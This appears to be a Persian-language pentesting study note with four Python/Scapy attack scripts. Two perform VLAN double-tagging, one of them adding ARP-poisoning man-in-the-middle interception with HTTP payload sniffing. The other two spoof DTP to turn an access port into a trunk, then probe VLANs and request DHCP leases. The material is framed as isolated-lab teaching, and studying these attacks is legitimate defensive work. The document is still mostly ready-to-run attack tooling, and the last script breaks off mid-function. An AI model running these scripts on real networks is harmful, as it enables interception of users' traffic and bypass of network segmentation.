---
Episode: E1
Date: 2026-04-24T18:28:00
Title: Network Attacks Types
tags:
  - Networking
  - network_security
  - network_attacks
  - Network_Pentest
Categories:
  - Networking
  - Network Pentesting
  - Network Security
Is Finished?:
Practice Status:
Spend Time:
Tools:
banner:
banner_icon:
Home:
Previous Episode:
Next Episode:
---
-------
### VLAN Hopping - Double Tagging
#### Advance VLAN Hopping Double Tagging using Python
این حمله یک‌ طرفه (Simplex) است یعنی فقط می‌تواند بسته را  ارسال کند و نمی‌توانید پاسخ را نمایش دهد. برای مشاهده پاسخ باید از حملات MITM و ابزار `Wireshark` یا `tcpdump` استفاده کنیم.
```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def double_tag_attack(target_ip, target_mac, victim_vlan, native_vlan, iface):
    """
    آموزش حملات دابل تگینگ برای کلاس امنیت سایبری
    پارامترها:
    - target_ip: IP قربانی در VLAN مقصد (مثلاً 192.168.20.5)
    - target_mac: MAC قربانی (مثلاً "00:0c:29:a1:b2:c3")
    - victim_vlan: VLAN ID قربانی (مثلاً 20)
    - native_vlan: Native VLAN ترانک (پیش‌فرض 1)
    - iface: اینترفیس مهاجم
    """
    
    # ما می‌خواهیم یک بسته ICMP Echo Request جعلی به قربانی بفرستیم
    # لایه‌ها از داخل به خارج:
    
    # 1. Payload: یک بسته ICMP ساده
    payload = IP(src="10.99.99.99", dst=target_ip) / ICMP()
    
    # 2. تگ داخلی (تگی که قربانی در آن قرار دارد)
    # اولویت (prio) را صفر و id را victim_vlan می‌دهیم
    inner_tag = Dot1Q(prio=0, id=victim_vlan, vlan=victim_vlan)
    
    # 3. تگ خارجی (Native VLAN)
    # این تگ توسط سوییچ اول کنده می‌شود!
    outer_tag = Dot1Q(prio=0, id=native_vlan, vlan=native_vlan)
    
    # 4. لایه اترنت
    # مبدأ MAC مهاجم، مقصد MAC قربانی (یا Broadcast اگر MAC را نمی‌دانید)
    ether = Ether(src=get_if_hwaddr(iface), dst=target_mac)
    
    # سرهم کردن فریم نهایی
    # Scapy خودش لایه‌ها را از داخل به خارج می‌چیند
    pkt = ether / outer_tag / inner_tag / payload
    
    print(f"[*] شبیه‌ساز آموزشی Double VLAN Hopping")
    print(f"    اینترفیس: {iface}")
    print(f"    Native VLAN: {native_vlan}")
    print(f"    Victim VLAN: {victim_vlan}")
    print(f"    Target: {target_ip} ({target_mac})")
    print("-" * 50)
    print("[*] ارسال فریم مخرب...")
    print("    تگ خارجی (VLAN {}) -> توسط سوییچ اول حذف می‌شود.".format(native_vlan))
    print("    تگ داخلی (VLAN {}) -> نزد سوییچ دوم باقی می‌ماند.".format(victim_vlan))
    
    sendp(pkt, iface=iface, verbose=False)
    print("[+] بسته ارسال شد! اگر حمله موفق باشد، قربانی ICMP Echo Request را دریافت می‌کند.")

if __name__ == "__main__":
    # تنظیمات نمونه - این مقادیر را بر اساس شبکه آزمایشگاهیتان تغییر دهید
    TARGET_IP = "192.168.20.5"       # IP یک دستگاه در VLAN 20
    TARGET_MAC = "ff:ff:ff:ff:ff:ff" # Broadcast (همیشه جواب می‌دهد)
    VICTIM_VLAN = 20                 # VLAN قربانی
    NATIVE_VLAN = 1                  # Native VLAN ترانک
    IFACE = "eth0"                   # کارت شبکه متصل به پورت Access (که در VLAN 1 است)
    
    # راهنمایی مدرس:
    print("=" * 60)
    print("شرح آزمایشگاه:")
    print("1. مهاجم به یک پورت Access متصل است (در VLAN {}).".format(NATIVE_VLAN))
    print("2. قربانی در VLAN {} است.".format(VICTIM_VLAN))
    print("3. مسیر مهاجم به قربانی از یک ترانک عبور می‌کند.")
    print("4. Native VLAN ترانک = {}".format(NATIVE_VLAN))
    print("=" * 60)
    
    # برای اجرای آزمایش، کامنت زیر را بردارید
    # double_tag_attack(TARGET_IP, TARGET_MAC, VICTIM_VLAN, NATIVE_VLAN, IFACE)
    
    print("\n[!] برای اجرای واقعی، خط آخر کد را uncomment کنید.")
    print("[!] تأکید: فقط در محیط آزمایشگاهی ایزوله استفاده شود.")
```
#### Advance VLAN Hopping Double Tagging using Python + Show Response
##### Codes
```python
#!/usr/bin/env python3
"""
Double VLAN Hopping - Full Duplex MITM Attack
مدرس: برای آموزش مفاهیم امنیتی در کلاس
هشدار: فقط در محیط آزمایشگاهی ایزوله استفاده شود!

سناریوی آزمایشگاه:
- مهاجم در VLAN 1 (Native) روی پورت Access
- قربانی در VLAN 20
- Default Gateway قربانی: 192.168.20.1
- ترانک بین سوییچ‌ها Native VLAN 1 دارد
"""

from scapy.all import *
import sys
import time
import threading

class DoubleTaggingMITM:
    def __init__(self, iface, victim_ip, victim_mac, gateway_ip, gateway_mac, 
                 victim_vlan, native_vlan, attacker_ip_in_victim_vlan):
        """
        پارامترها:
        - iface: اینترفیس مهاجم
        - victim_ip: IP قربانی در VLAN مقصد
        - victim_mac: MAC قربانی
        - gateway_ip: IP دروازه پیش‌فرض قربانی
        - gateway_mac: MAC واقعی دروازه (می‌توانیم با sniff پیدا کنیم)
        - victim_vlan: VLAN ID قربانی (مثلاً 20)
        - native_vlan: Native VLAN ترانک (مثلاً 1)
        - attacker_ip_in_victim_vlan: یک IP جعلی در رنج قربانی برای خودمان
        """
        self.iface = iface
        self.victim_ip = victim_ip
        self.victim_mac = victim_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.victim_vlan = victim_vlan
        self.native_vlan = native_vlan
        self.attacker_ip = attacker_ip_in_victim_vlan
        self.attacker_mac = get_if_hwaddr(iface)
        
        self.stop_sniffing = False
        self.captured_packets = []
        
    def craft_double_tagged_packet(self, inner_packet):
        """یک بسته را با دو تگ VLAN بسته‌بندی می‌کند"""
        inner_tag = Dot1Q(prio=0, id=self.victim_vlan, vlan=self.victim_vlan)
        outer_tag = Dot1Q(prio=0, id=self.native_vlan, vlan=self.native_vlan)
        ether = Ether(src=self.attacker_mac, dst=self.victim_mac)
        return ether / outer_tag / inner_tag / inner_packet
    
    def send_arp_poison_to_victim(self):
        """
        به قربانی می‌گوییم: "IP گیت‌وی متعلق به MAC من است"
        یعنی خودمان را به جای گیت‌وی جا می‌زنیم
        """
        # ساخت بسته ARP Reply جعلی
        arp_to_victim = ARP(
            op=2,  # is-at (reply)
            hwsrc=self.attacker_mac,  # MAC ما
            psrc=self.gateway_ip,     # IP گیت‌وی (می‌گوییم من هستم!)
            hwdst=self.victim_mac,     # MAC قربانی
            pdst=self.victim_ip       # IP قربانی
        )
        
        pkt = self.craft_double_tagged_packet(arp_to_victim)
        sendp(pkt, iface=self.iface, verbose=False)
        print(f"[+] ARP Poison: به قربانی ({self.victim_ip}) گفتیم که گیت‌وی ({self.gateway_ip}) در MAC ما ({self.attacker_mac}) است")
    
    def send_arp_poison_to_gateway(self):
        """
        به گیت‌وی می‌گوییم: "IP قربانی متعلق به MAC من است"
        توجه: این بسته از طریق VLAN 1 (بدون دابل تگ) به گیت‌وی می‌رسد
        """
        # بسته ARP Reply جعلی برای گیت‌وی
        arp_to_gateway = ARP(
            op=2,  # is-at (reply)
            hwsrc=self.attacker_mac,   # MAC ما
            psrc=self.victim_ip,       # IP قربانی (می‌گوییم من هستم!)
            hwdst=self.gateway_mac,     # MAC گیت‌وی
            pdst=self.gateway_ip       # IP گیت‌وی
        )
        
        # ارسال مستقیم به گیت‌وی (ممکن است از همان پورت مهاجم قابل دسترس باشد)
        ether = Ether(src=self.attacker_mac, dst=self.gateway_mac)
        pkt = ether / arp_to_gateway
        sendp(pkt, iface=self.iface, verbose=False)
        print(f"[+] ARP Poison: به گیت‌وی ({self.gateway_ip}) گفتیم که قربانی ({self.victim_ip}) در MAC ما ({self.attacker_mac}) است")
    
    def enable_ip_forwarding(self):
        """فعال‌سازی IP Forwarding در سیستم مهاجم"""
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        print("[+] IP Forwarding فعال شد")
    
    def packet_callback(self, pkt):
        """نمایش بسته‌های دریافتی جالب"""
        if IP in pkt:
            if pkt[IP].src == self.victim_ip or pkt[IP].dst == self.victim_ip:
                self.captured_packets.append(pkt)
                print(f"\n[>] بسته رهگیری شد: {pkt[IP].src}:{pkt.sport if TCP in pkt or UDP in pkt else '?'} -> "
                      f"{pkt[IP].dst}:{pkt.dport if TCP in pkt or UDP in pkt else '?'}")
                
                # نمایش محتوای HTTP
                if TCP in pkt and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80):
                    if Raw in pkt:
                        payload = pkt[Raw].load[:200]
                        print(f"    [HTTP Data] {payload}")
    
    def start_sniffing(self):
        """شروع اسنیف کردن ترافیک در بک‌گراند"""
        print("[*] شروع اسنیف کردن ترافیک...")
        sniff(iface=self.iface, prn=self.packet_callback, 
              stop_filter=lambda x: self.stop_sniffing)
    
    def poison_loop(self, interval=5):
        """حلقه ARP Poisoning مداوم"""
        print("[*] حلقه ARP Poisoning شروع شد (هر {} ثانیه)".format(interval))
        try:
            while not self.stop_sniffing:
                self.send_arp_poison_to_victim()
                time.sleep(1)
                self.send_arp_poison_to_gateway()
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[!] توقف حمله...")
    
    def restore_arp(self):
        """بازگرداندن جداول ARP به حالت عادی"""
        print("[*] بازگرداندن جداول ARP...")
        
        # ARP صحیح برای قربانی
        restore_to_victim = ARP(
            op=2, hwsrc=self.gateway_mac, psrc=self.gateway_ip,
            hwdst=self.victim_mac, pdst=self.victim_ip
        )
        pkt1 = self.craft_double_tagged_packet(restore_to_victim)
        
        # ARP صحیح برای گیت‌وی
        restore_to_gateway = ARP(
            op=2, hwsrc=self.victim_mac, psrc=self.victim_ip,
            hwdst=self.gateway_mac, pdst=self.gateway_ip
        )
        pkt2 = Ether(src=self.attacker_mac, dst=self.gateway_mac) / restore_to_gateway
        
        for _ in range(5):
            sendp(pkt1, iface=self.iface, verbose=False)
            sendp(pkt2, iface=self.iface, verbose=False)
            time.sleep(0.5)
        print("[+] جداول ARP بازگردانده شدند")
    
    def run(self, duration=60):
        """اجرای کامل حمله"""
        print("=" * 60)
        print("[*] Double VLAN Hopping - Full Duplex MITM Attack")
        print(f"    مهاجم MAC: {self.attacker_mac}")
        print(f"    قربانی: {self.victim_ip} ({self.victim_mac})")
        print(f"    گیت‌وی: {self.gateway_ip} ({self.gateway_mac})")
        print(f"    VLAN قربانی: {self.victim_vlan}")
        print(f"    Native VLAN: {self.native_vlan}")
        print("=" * 60)
        
        # فعال‌سازی فورواردینگ
        self.enable_ip_forwarding()
        
        # شروع اسنیف در بک‌گراند
        sniff_thread = threading.Thread(target=self.start_sniffing)
        sniff_thread.daemon = True
        sniff_thread.start()
        
        # شروع ARP Poisoning
        try:
            print(f"[*] حمله MITM برای {duration} ثانیه اجرا می‌شود...")
            print("[*] در این مدت، ترافیک قربانی را مشاهده کنید...\n")
            
            start_time = time.time()
            while time.time() - start_time < duration:
                self.send_arp_poison_to_victim()
                time.sleep(1)
                self.send_arp_poison_to_gateway()
                time.sleep(3)
                
        except KeyboardInterrupt:
            print("\n[!] قطع توسط کاربر")
        finally:
            self.stop_sniffing = True
            self.restore_arp()
            time.sleep(2)  # صبر برای توقف اسنیف
            print(f"\n[+] حمله پایان یافت. {len(self.captured_packets)} بسته رهگیری شد.")


def simple_bidirectional_icmp(iface, target_ip, target_mac, victim_vlan, native_vlan):
    """
    روش ساده‌تر - ارسال ICMP Echo و دریافت پاسخ
    یک بسته ICMP با دابل تگ می‌فرستیم و همزمان اسنیف می‌کنیم
    
    نکته: فقط در صورتی جواب می‌دهد که قربانی Route برگشت به ما داشته باشد
    (که معمولاً ندارد، مگر با MITM کامل بالا)
    """
    print("[*] روش ساده: ارسال ICMP و انتظار برای پاسخ")
    print("[!] توجه: این روش فقط در صورتی کار می‌کند که مسیر برگشت وجود داشته باشد")
    
    # ساخت بسته ICMP با دابل تگ
    inner_tag = Dot1Q(prio=0, id=victim_vlan, vlan=victim_vlan)
    outer_tag = Dot1Q(prio=0, id=native_vlan, vlan=native_vlan)
    
    ip_layer = IP(src=get_if_addr(iface), dst=target_ip)
    icmp_layer = ICMP()
    
    ether = Ether(src=get_if_hwaddr(iface), dst=target_mac)
    pkt = ether / outer_tag / inner_tag / ip_layer / icmp_layer
    
    # ارسال و دریافت همزمان
    print(f"[*] ارسال ICMP Echo Request به {target_ip} (VLAN {victim_vlan})")
    answers = srp1(pkt, iface=iface, timeout=3, verbose=True)
    
    if answers:
        print(f"\n[+] پاسخی از {target_ip} دریافت شد!")
        answers.show()
        return True
    else:
        print(f"\n[-] پاسخی دریافت نشد (ممکن است مسیر برگشت وجود نداشته باشد)")
        return False


# ===================================================================
# راهنمای آزمایشگاه برای مدرس
# ===================================================================
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║     Double VLAN Hopping - نسخه آموزشی دوطرفه               ║
║     ویژه مدرسان امنیت سایبری                                ║
╚══════════════════════════════════════════════════════════════╝

دو روش برای اجرا:

1. روش ساده (ICMP):
   simple_bidirectional_icmp(iface, target_ip, target_mac, victim_vlan, native_vlan)

2. روش کامل MITM با ARP Poisoning:
   نیاز به تنظیم پارامترها دارد - کامنت‌های پایین را ببینید
   
پیش‌نیازهای آزمایشگاه:
- مهاجم: پورت Access در VLAN 1
- قربانی: در VLAN 20
- ترانک با Native VLAN 1 بین سوییچ‌ها
- فعال بودن IP Forwarding روی مهاجم
    """)
    
    # نمونه پیکربندی - برای اجرا کامنت‌ها را بردارید
    IFACE = "eth0"
    VICTIM_IP = "192.168.20.5"
    VICTIM_MAC = "00:0c:29:a1:b2:c3"
    GATEWAY_IP = "192.168.20.1"
    GATEWAY_MAC = "00:0c:29:d4:e5:f6"  # این را با sniff پیدا کنید
    VICTIM_VLAN = 20
    NATIVE_VLAN = 1
    ATTACKER_IP = "192.168.20.99"  # یک IP آزاد در VLAN قربانی
    
    # برای اجرای حمله MITM کامل:
    # mitm = DoubleTaggingMITM(
    #     IFACE, VICTIM_IP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC,
    #     VICTIM_VLAN, NATIVE_VLAN, ATTACKER_IP
    # )
    # mitm.run(duration=120)  # برای 2 دقیقه اجرا می‌شود
```
##### Description
1. **استفاده از Double Tagging برای عبور از ترانک:**
	- تگ خارجی (VLAN 1) توسط سوییچ اول حذف می‌شود.
	- تگ داخلی (VLAN 20) بسته را به قربانی می‌رساند.

2. **استفاده از ARP Poisoning برای برگشت ترافیک:**
	- قربانی فکر می‌کند MAC ما همان MAC گیت‌وی است.
	- ترافیک خروجی قربانی به سمت ما می‌آید (از طریق VLAN 1).
	- ما ترافیک را می‌بینیم و سپس Forward می‌کنیم.

3. **استفاده از IP Forwarding برای حفظ ارتباط:**
	- اگر فقط ARP Poison کنیم، قربانی اینترنتش قطع می‌شود.
	- با فعال کردن Forwarding، ترافیک را به گیت‌وی واقعی می‌فرستیم.
	- قربانی متوجه قطعی نمی‌شود (MITM شفاف).

4. **مشاهده ارتباط با Wireshark:**
	- یک اسنیف روی اینترفیس مهاجم باز کنید.
	- بسته‌های ICMP/HTTP قربانی را در لحظه نشان دهید.
	- این "اثبات حمله" برای دانشجویان بسیار تأثیرگذار است.
### VLAN Hopping - DTP
#### VLAN Hopping - DTP(Simplex Version)
در این نسخه از کد حمله فقط انجام میشود(یعنی بسته فقط ارسال میشود) و در واقع پاسخ بسته ها مشاهده نمیشود.
```python
#!/usr/bin/env python3
"""
DTP VLAN Hopping - نسخه ساده آموزشی
مدرس: فقط در محیط آزمایشگاهی ایزوله استفاده شود!

این کد بسته‌های DTP Desirable جعلی روی یک پورت Access ارسال می‌کند
تا سوییچ سیسکو را فریب دهد و پورت را به Trunk تبدیل کند.
"""

from scapy.all import *
import time
import argparse

def create_dtp_desirable(src_mac):
    """
    ساخت بسته DTP با وضعیت "Desirable" (درخواست Trunk شدن)
    
    ساختار بسته DTP:
    - Ethernet: dst=01:00:0c:cc:cc:cc (Multicast DTP)
    - LLC: dsap=0xaa, ssap=0xaa, ctrl=0x03
    - SNAP: OUI=0x00000c (Cisco), proto=0x2004 (DTP)
    - DTP Payload: اطلاعات مذاکره
    """
    
    # MAC مخصوص DTP (Cisco Shared Spanning Tree Address - در DTP هم استفاده می‌شود)
    dtp_multicast = "01:00:0c:cc:cc:cc"
    
    # SNAP header: OUI سیسکو + Protocol ID مخصوص DTP
    snap = b'\xaa\xaa\x03\x00\x00\x0c\x20\x04'
    
    # DTP Header (نسخه ساده - فقط نشان‌دهنده Desirable Mode)
    # این بایت‌ها نشان می‌دهند که پورت در حالت Dynamic Desirable است
    # ساختار دقیق: Version(1) | Domain | Status | Type | DTP TLV
    dtp_payload = bytes([
        0x01,       # Version: 1
        0x00,       # Domain (null - no domain)
        0x03,       # Status: 0x03 = Dynamic Desirable
        0xa5,       # Type: 0xa5 = DTP packet
        # TLV: اینجا یک TLV ساده که نشان‌دهنده Dynamic Desirable mode است
        0x00, 0x01, # TLV Type: 0x0001 (Neighbor ID)
        0x00, 0x04, # TLV Length: 4
        0x00, 0x00, 0x00, 0x01,  # Fake Neighbor ID
        0x00, 0x02, # TLV Type: 0x0002 (Status)  
        0x00, 0x05, # TLV Length: 5
        0x00, 0x00, 0x00, 0x00, 0x03,  # Status: Dynamic Desirable (trunking desired)
    ])
    
    # لایه دوم: اترنت
    ether = Ether(src=src_mac, dst=dtp_multicast)
    
    # بسته نهایی: اترنت + SNAP/LLC + DTP
    pkt = ether / Raw(load=snap + dtp_payload)
    
    return pkt

def dtp_trunk_attack(iface, interval=1, count=10):
    """
    حمله DTP: تبدیل پورت Access به Trunk
    
    پارامترها:
    - iface: اینترفیس مهاجم
    - interval: فاصله بین بسته‌ها (ثانیه)
    - count: تعداد بسته‌های ارسالی
    """
    src_mac = get_if_hwaddr(iface)
    
    print("=" * 60)
    print("[*] DTP VLAN Hopping Attack - نسخه آموزشی")
    print(f"    اینترفیس: {iface}")
    print(f"    MAC مهاجم: {src_mac}")
    print(f"    MAC مقصد (DTP Multicast): 01:00:0c:cc:cc:cc")
    print(f"    وضعیت درخواستی: Dynamic Desirable")
    print("=" * 60)
    print("\n[*] سناریو:")
    print("    1. مهاجم به پورت Access سوییچ (حالت dynamic auto) متصل است")
    print("    2. بسته‌های DTP Desirable ارسال می‌کند")
    print("    3. سوییچ مذاکره را قبول می‌کند")
    print("    4. پورت به Trunk تبدیل می‌شود!")
    print("\n[*] شروع حمله...")
    
    for i in range(count):
        pkt = create_dtp_desirable(src_mac)
        sendp(pkt, iface=iface, verbose=False)
        
        if i == 0:
            print(f"\n[+] بسته DTP Desirable ارسال شد")
            print(f"\n[*] نمایش ساختار بسته:")
            pkt.show()
            print("\n[*] نمایش هگز:")
            print(hexdump(pkt))
        
        print(f"\r[+] بسته {i+1}/{count} ارسال شد", end="", flush=True)
        time.sleep(interval)
    
    print("\n\n[+] حمله کامل شد!")
    print("[*] اگر موفقیت‌آمیز باشد، پورت اکنون Trunk است.")
    print("[*] حالا می‌توانید همه VLANها را ببینید:")
    print("    - با Wireshark ترافیک را اسنیف کنید")
    print("    - بسته‌های Tagged مختلف را مشاهده خواهید کرد")
    print("\n[!] برای برگرداندن: کابل را قطع/وصل کنید یا پورت را reset کنید")

def check_trunk_status():
    """
    راهنمای بررسی وضعیت Trunk شدن پورت
    """
    print("\n" + "=" * 60)
    print("[*] بررسی موفقیت حمله (از روی سوییچ):")
    print("=" * 60)
    print("""
دستورات سیسکو برای بررسی:
    show interface <interface> switchport
    show interface <interface> trunk
    
نشانه‌های موفقیت:
    - Administrative Mode: dynamic auto
    - Operational Mode: trunk          <-- این یعنی حمله موفق بوده!
    - Trunking VLANs Enabled: ALL       <-- دسترسی به همه VLANها
    """)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DTP VLAN Hopping - نسخه آموزشی')
    parser.add_argument('-i', '--iface', default='eth0', help='اینترفیس مهاجم (پیش‌فرض: eth0)')
    parser.add_argument('-c', '--count', type=int, default=10, help='تعداد بسته‌ها (پیش‌فرض: 10)')
    parser.add_argument('-t', '--interval', type=float, default=1, help='فاصله ارسال (پیش‌فرض: 1 ثانیه)')
    parser.add_argument('--check-status', action='store_true', help='نمایش راهنمای بررسی وضعیت')
    
    args = parser.parse_args()
    
    if args.check_status:
        check_trunk_status()
    else:
        dtp_trunk_attack(args.iface, args.interval, args.count)
```
#### VLAN Hopping - DTP(Full Duplex Version)
در این نسخه هم حمله انجام میشود و هم پاسخ های دریافتی مشاهده میشود.
```python
#!/usr/bin/env python3
"""
DTP VLAN Hopping - نسخه پیشرفته دوطرفه
مدرس: برای آموزش MITM کامل بعد از Trunk شدن پورت

فازهای حمله:
1. DTP Flooding: تبدیل پورت به Trunk
2. VLAN Discovery: کشف VLANهای موجود 
3. DHCP Discovery/ARP در هر VLAN: گرفتن IP در همه VLANها
4. ترافیک دوطرفه: ارسال و دریافت بسته در VLANهای مختلف
"""

from scapy.all import *
import time
import threading
import argparse
import ipaddress

class DTPFullDuplexAttack:
    def __init__(self, iface):
        self.iface = iface
        self.src_mac = get_if_hwaddr(iface)
        self.stop_sniff = False
        self.discovered_vlans = []
        self.vlan_ips = {}  # vlan_id -> assigned_ip
        self.received_packets = []
        self.lock = threading.Lock()
        
    def create_dtp_desirable(self):
        """ساخت بسته DTP با وضعیت Desirable"""
        dtp_multicast = "01:00:0c:cc:cc:cc"
        snap = b'\xaa\xaa\x03\x00\x00\x0c\x20\x04'
        
        dtp_payload = bytes([
            0x01, 0x00, 0x03, 0xa5,
            0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01,
            0x00, 0x02, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x03,
        ])
        
        return Ether(src=self.src_mac, dst=dtp_multicast) / Raw(load=snap + dtp_payload)
    
    def phase1_dtp_attack(self, count=10):
        """فاز ۱: تبدیل پورت به Trunk"""
        print("\n[فاز ۱] DTP Flooding - تبدیل پورت به Trunk")
        print("-" * 50)
        
        pkt = self.create_dtp_desirable()
        
        for i in range(count):
            sendp(pkt, iface=self.iface, verbose=False)
            sys.stdout.write(f"\r[+] ارسال بسته DTP Desirable: {i+1}/{count}")
            sys.stdout.flush()
            time.sleep(0.5)
        
        print("\n[+] فاز ۱ کامل شد - ۵ ثانیه صبر برای مذاکره...")
        time.sleep(5)
    
    def phase2_vlan_discovery(self):
        """فاز ۲: کشف VLANهای موجود با ارسال درخواست CDP/LLDP"""
        print("\n[فاز ۲] VLAN Discovery")
        print("-" * 50)
        print("[*] تلاش برای کشف VLANها...")
        
        # روش ۱: ارسال ARP روی VLANهای رایج
        common_vlans = [1, 10, 20, 30, 50, 100, 200]
        
        for vlan_id in common_vlans:
            print(f"\r[*] بررسی VLAN {vlan_id}...", end="", flush=True)
            
            # ساخت ARP Request با تگ VLAN
            arp_req = ARP(pdst="192.168.0.0/16")  # Broadcast for discovery
            tagged = Ether(src=self.src_mac, dst="ff:ff:ff:ff:ff:ff") / \
                     Dot1Q(vlan=vlan_id) / arp_req
            
            sendp(tagged, iface=self.iface, verbose=False, count=3)
            time.sleep(0.3)
        
        print("\n[+] فاز ۲ کامل شد - VLANهای رایج بررسی شدند")
    
    def phase3_dhcp_vlan_scan(self, vlan_list=range(1, 101, 10), timeout=5):
        """فاز ۳: گرفتن IP در VLANهای مختلف از طریق DHCP"""
        print("\n[فاز ۳] DHCP Discovery در VLANهای مختلف")
        print("-" * 50)
        
        def dhcp_discover_vlan(vlan_id, src_mac, iface, results, lock):
            """DHCP Discover با تگ VLAN"""
            # ساخت بسته DHCP Discover
            dhcp_discover = (
                Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
                Dot1Q(vlan=vlan_id) /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac2str(src_mac), xid=random.randint(0, 0xFFFFFFFF)) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            
            # ارسال و دریافت پاسخ
            sendp(dhcp_discover, iface=iface, verbose=False)
            
            # اسنیف برای DHCP Offer (فقط ۲ ثانیه)
            def is_dhcp_offer(pkt):
                return (DHCP in pkt and 
                        pkt[DHCP] and 
                        pkt[DHCP].options[0][1] == 2)  # DHCP Offer
            
            answers = sniff(iface=iface, timeout=timeout, lfilter=is_dhcp_offer, count=1)
            
            if answers:
                offer = answers[0]
                offered_ip = offer[BOOTP].yiaddr
                with lock:
                    results[vlan_id] = offered_ip
                    print(f"\n[+] VLAN {vlan_id}: DHCP Offer دریافت شد - IP: {offered_ip}")
        
        # اجرای DHCP Discover در VLANهای مختلف
        threads = []
        for vlan_id in vlan_list:
            t = threading.Thread(target=dhcp_discover_vlan, 
                               args=(vlan_id, self.src_mac, self.iface, 
                                     self.vlan_ips, self.lock))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.5)
        
        # صبر برای تکمیل همه Threadها
        for t in threads:
            t.join(timeout=10)
        
        print(f"\n[+] فاز ۳ کامل شد - {len(self.vlan_ips)} VLAN پاسخ دادند:")
        for vlan, ip in self.vlan_ips.items():
            print(f"    VLAN {vlan}: {ip}")
    
    def packet_callback(self, pkt):
        """Callback برای نمایش بسته‌های دریافتی"""
        if self.stop_sniff:
            return
        
        with self.lock:
            self.received_packets.append(pkt)
        
        # فیلتر بسته‌های جالب
        if Dot1Q in pkt:
            vlan_id = pkt[Dot1Q].vlan
            if IP in pkt:
                src = pkt[IP].src
                dst = pkt[IP].dst
                proto = "TCP" if TCP in pkt else "UDP" if UDP in pkt else "ICMP"
                print(f"\n[>] دریافت بسته | VLAN: {vlan_id} | {proto} | {src} -> {dst}")
                
                # نمایش محتوای HTTP
                if TCP in pkt and Raw in pkt:
                    if pkt[TCP].dport == 80 or pkt[TCP].sport == 80:
                        print(f"    [HTTP] {pkt[Raw].load[:100]}")
    
    def start_sniffing(self, vlan_filter=None):
        """شروع اسنیفینگ در بک‌گراند"""
        print(f"\n[+] شروع اسنیفینگ ترافیک (VLAN filter: {vlan_filter or 'ALL'})")
        
        def sniff_filter(pkt):
            if Dot1Q not in pkt:
                return False
            if vlan_filter and pkt[Dot1Q].vlan not in vlan_filter:
                return False
            return True
        
        self.sniff_thread = threading.Thread(
            target=lambda: sniff(iface=self.iface, 
                                prn=self.packet_callback,
                                lfilter=sniff_filter,
                                stop_filter=lambda x: self.stop_sniff,
                                store=True)
        )
        self.sniff_thread.daemon = True
        self.sniff_thread.start()
    
    def phase4_bidirectional_test(self, target_vlan, target_ip, duration=30):
        """فاز ۴: تست دوطرفه - ارسال و دریافت"""
        print(f"\n[فاز ۴] تست ارتباط دوطرفه با VLAN {target_vlan}")
        print("-" * 50)
        
        # شروع اسنیف با فیلتر VLAN مقصد
        self.start_sniffing(vlan_filter=[target_vlan])
        
        print(f"[*] ارسال ICMP Echo Request به {target_ip} در VLAN {target_vlan}")
        
        start_time = time.time()
        seq = 0
        
        try:
            while time.time() - start_time < duration:
                # ساخت بسته ICMP با تگ VLAN
                pkt = (
                    Ether(src=self.src_mac, dst="ff:ff:ff:ff:ff:ff") /
                    Dot1Q(vlan=target_vlan) /
                    IP(src=get_if_addr(self.iface), dst=target_ip) /
                    ICMP(seq=seq)
                )
                
                # ارسال و انتظار برای پاسخ
                ans = srp1(pkt, iface=self.iface, timeout=2, verbose=False)
                
                if ans:
                    print(f"[+] seq={seq}: پاسخ از {ans[IP].src} در VLAN {target_vlan}")
                    ans.show()
                else:
                    print(f"[-] seq={seq}: پاسخی دریافت نشد")
                
                seq += 1
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n[!] قطع توسط کاربر")
        finally:
            self.stop_sniff = True
            time.sleep(1)
            print(f"\n[+] تست کامل شد. {len(self.received_packets)} بسته در کل دریافت شد")
    
    def show_summary(self):
        """نمایش خلاصه حمله"""
        print("\n" + "=" * 60)
        print("خلاصه حمله DTP VLAN Hopping")
        print("=" * 60)
        print(f"اینترفیس: {self.iface}")
        print(f"MAC مهاجم: {self.src_mac}")
        print(f"VLANهای کشف‌شده با DHCP: {list(self.vlan_ips.keys())}")
        print(f"تعداد بسته‌های دریافتی: {len(self.received_packets)}")
        print("=" * 60)


def main():
    print(r"""
    ╔══════════════════════════════════════════════════════╗
    ║   DTP VLAN Hopping - Full Duplex Attack             ║
    ║   نسخه آموزشی برای مدرسان امنیت سایبری              ║
    ╚══════════════════════════════════════════════════════╝
    
    هشدار: فقط در محیط آزمایشگاهی ایزوله!
    
    فازهای حمله:
    1. ارسال بسته‌های DTP برای تبدیل پورت به Trunk
    2. کشف VLANهای فعال
    3. دریافت IP از DHCP در VLANهای مختلف
    4. ارتباط دوطرفه در VLAN هدف
    
    پیش‌نیازها:
    - سوییچ سیسکو با پورت روی dynamic auto (پیش‌فرض)
    - مجوز root در لینوکس
    """)
    
    parser = argparse.ArgumentParser(description='DTP VLAN Hopping - Full Duplex')
    parser.add_argument('-i', '--iface', default='eth0', help='اینترفیس مهاجم')
    parser.add_argument('--target-ip', help='IP هدف برای فاز ۴')
    parser.add_argument('--target-vlan', type=int, default=1, help='VLAN هدف برای فاز ۴')
    parser.add_argument('--duration', type=int, default=30, help='مدت زمان فاز ۴ (ثانیه)')
    parser.add_argument('--skip-dhcp', action='store_true', help='رد کردن فاز DHCP')
    parser.add_argument('--phase', type=int, choices=[1,2,3,4], 
                       help='فقط یک فاز خاص را اجرا کن')
    
    args = parser.parse_args()
    
    attack = DTPFullDuplexAttack(args.iface)
    
    try:
        if args.phase:
            # اجرای فقط یک فاز
            if args.phase == 1:
                attack.phase1_dtp_attack()
            elif args.phase == 2:
                attack.phase2_vlan_discovery()
            elif args.phase == 3:
                attack.phase3_dhcp_vlan_scan()
            elif args.phase == 4:
                attack.phase4_bidirectional_test(args.target_vlan, args.target_ip or "192.168.1.1", args.duration)
        else:
